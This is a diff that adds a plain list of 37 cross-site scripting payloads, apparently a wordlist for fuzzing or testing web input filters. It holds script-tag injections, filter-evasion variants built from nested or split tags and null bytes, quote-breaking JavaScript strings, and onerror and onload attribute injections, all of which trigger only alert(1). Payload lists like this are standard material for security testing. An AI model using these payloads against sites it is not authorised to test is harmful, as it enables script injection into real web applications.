@@ -1,0 +1,37 @@
+<script>alert(1);</script>
+<scr ipt>alert(1);</scr ipt>
+"><script>alert(1);</script>
+"><script>alert(1);</script><"
+'><script>alert(1);</script>
+'><script>alert(1);</script><'
+<SCRIPT>alert(1);</SCRIPT>
+<scri<script>pt>alert(1);</scr</script>ipt>
+<SCRI<script>PT>alert(1);</SCR</script>IPT>
+<scri<scr<script>ipt>pt>alert(1);</scr</sc</script>ript>ipt>
+";alert(1);"
+';alert(1);'
+;alert(1);
+alert(1);
+<SCR%00IPT>alert(1)</SCR%00IPT>
+\";alert(1);//
+<STYLE TYPE="text/javascript">alert(1);</STYLE>
+<<SCRIPT>alert(1)//<</SCRIPT>
+"onerror=alert(1) 
+<<SCRIPT>alert(1)//<</SCRIPT>
+<img src="1" onerror="alert(1)">
+<img src='1' onerror='alert(1)'
+onerror="alert(1)"
+onerror='alert(1)'
+onload="alert(1)"
+onload='alert(1)'
+<IMG """><SCRIPT>alert(1)</SCRIPT>">
+<IMG '''><SCRIPT>alert(1)</SCRIPT>'>
+"""><SCRIPT>alert(1)
+'''><SCRIPT>alert(1)'
+<IFRAME SRC='f' onerror="alert(1)"></IFRAME>
+<IFRAME SRC='f' onerror='alert(1)'></IFRAME>
+');alert(1);//%0A%0Dif('
+");alert(1);//%0A%0Dif("
+[eval(alert(1))]
+'+alert(1)+'
+"+alert(1)+"
